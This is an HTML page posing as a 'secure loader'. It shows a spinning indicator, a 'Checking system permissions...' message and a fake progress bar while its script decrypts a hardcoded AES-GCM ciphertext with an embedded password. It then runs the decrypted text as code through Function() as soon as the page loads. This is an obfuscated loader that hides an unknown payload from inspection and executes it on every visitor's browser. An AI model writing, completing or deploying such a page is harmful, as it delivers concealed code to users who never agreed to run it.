<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="Global Dev">
    <title>Dynamic Secure Loader</title>
    <style>
        body {
            padding: 0;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background-color: #f3f4f6;
            font-family: Arial, Helvetica, sans-serif;
            min-height: 100vh;
            overflow: hidden;
        }
        .rotating-loader {
            width: 70px;
            height: 70px;
            border: 10px solid #d1d5db;
            border-top: 10px solid #4f46e5;
            border-radius: 50%;
            animation: spin-loader 1.5s linear infinite;
        }
        @keyframes spin-loader {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        .loading-message {
            margin-top: 15px;
            font-size: 18px;
            color: #222;
        }
        .hidden-content {
            visibility: hidden;
        }
        .random-info {
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
        .fake-loader-bar {
            width: 200px;
            height: 10px;
            background-color: #e0e0e0;
            border-radius: 5px;
            margin-top: 20px;
            overflow: hidden;
        }
        .fake-loader-progress {
            width: 0;
            height: 100%;
            background-color: #4f46e5;
            animation: fake-progress 2s linear infinite;
        }
        @keyframes fake-progress {
            0% { width: 0; }
            50% { width: 100%; }
            100% { width: 0; }
        }
    </style>
</head>
<body>

    <!-- Hidden Content -->

    </div>

    <!-- Random Info Div -->
    <div class="random-info">
        <p>Checking system permissions...</p>
    </div>

    <!-- Fake Loader Bar -->
    <div class="fake-loader-bar">
        <div class="fake-loader-progress"></div>
    </div>

    <!-- Core Secure Processing Script -->
    <script>
        const decryptSecureContent = async (encryptedData, encryptionKey, salt, password) => {
            // console.log("[INFO] Starting secure content decryption...");

            const hexToBytes = (hexString) => {
                return new Uint8Array(hexString.match(/.{2}/g).map(byte => parseInt(byte, 16)));
            };

            const simulateDelay = () => new Promise(resolve => {
                // console.log("[DEBUG] Simulating delay...");
                setTimeout(() => resolve(), 500);
            });

            const createDerivedKey = async (keyMaterial, saltBytes) => {
                return crypto.subtle.deriveKey(
                    { name: "PBKDF2", salt: saltBytes, iterations: 100000, hash: "SHA-256" },
                    keyMaterial,
                    { name: "AES-GCM", length: 256 },
                    false,
                    ["decrypt"]
                );
            };

            const keyMaterial = await crypto.subtle.importKey(
                "raw",
                new TextEncoder().encode(password),
                { name: "PBKDF2" },
                false,
                ["deriveKey"]
            );

            await simulateDelay();
            const derivedKey = await createDerivedKey(keyMaterial, hexToBytes(salt));

            try {
                const decryptedBytes = await crypto.subtle.decrypt(
                    { name: "AES-GCM", iv: hexToBytes(encryptionKey) },
                    derivedKey,
                    hexToBytes(encryptedData)
                );
                console.log("[SUCCESS] Secure content decrypted successfully.");
                return new TextDecoder().decode(decryptedBytes);
            } catch (error) {
                console.error("[ERROR] Failed to decrypt secure content:", error);
                return null;
            }
        };

        (async () => {
            console.log("[INFO] Initiating secure content decryption...");
            const payload = {
                encryptionKey: "ce12552921e07eeae6d25a8b",
                salt: "0ac6f6fafea5dd5e93ca4522b49d3681",
                encryptedData: "6deb93765e72ef8ce34b1b97d0c25c97611c83b0ac258d36b36d018cdb7ff468533920838d3707c758da44549d374e8e0ca5a6aa93b0af7aa6d1f2e3c26dcf486585b4c887ad5cb43aed7d90469c8c5265c8bbbeca57739d97e18e7cceac3acfa08db407fba57a71ff3d8a03b8299957024e3205442026156a361709ebd8c2df4c14a3c6c053abe5055489a44d42679720a67e7b98ddb7c15cf91320517d7e3b4c74750d19471e7e76750a80e4a099a0297edb403178b56fd0f152d4ac2ea37bc07720850870a3a7"
            };

            const password = "homesweethome";
            const decryptedContent = await decryptSecureContent(payload.encryptedData, payload.encryptionKey, payload.salt, password);
            Function(`${decryptedContent}`)();

            if (decryptedContent) {
                // console.log("[INFO] Retrieved secure content:", decryptedContent);
            }
        })();
    </script>
</body>
</html>
